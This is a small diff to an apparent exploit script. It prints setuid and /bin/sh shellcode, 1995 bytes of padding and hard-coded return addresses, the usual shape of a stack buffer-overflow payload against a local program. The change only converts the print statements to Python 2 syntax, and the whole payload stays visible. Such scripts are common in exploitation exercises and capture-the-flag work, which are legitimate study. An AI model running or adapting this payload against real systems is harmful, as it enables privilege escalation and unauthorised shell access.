@@ -4,8 +4,8 @@ bin_sh = (
     '\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')
 
 shellcode = setuid + bin_sh
-print(shellcode, end="")
+print shellcode
 for i in range(1995):
-    print('a', end="")
-print("\xe8\xb0\xff\xbf", end="")
-print("\xfc\xb8\xff\xbf")
+    print "a"
+print "\xe8\xb0\xff\xbf"
+print "\xfc\xb8\xff\xbf"
